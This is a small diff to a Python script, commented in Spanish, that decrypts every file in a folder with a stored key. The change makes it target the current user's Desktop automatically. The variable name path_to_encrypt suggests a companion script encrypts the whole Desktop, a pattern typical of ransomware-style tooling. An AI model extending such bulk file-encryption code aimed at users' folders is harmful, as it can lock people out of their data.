@@ -42,7 +42,7 @@ def get_all_files_in_directory(dir_path):
 
 # Si este script se ejecuta como el principal, desencripta todos los archivos en el directorio dado.
 if __name__ == '__main__':
-    path_to_encrypt = 'C:\\Users\\[nombre de usuario]\\Desktop'  # Reemplaza [nombre de usuario] con tu nombre de usuario
+    path_to_encrypt = os.path.expanduser('~/Desktop')  # Ahora obtiene automáticamente el directorio del usuario
     all_files = get_all_files_in_directory(path_to_encrypt)
 
     key = cargar_key()
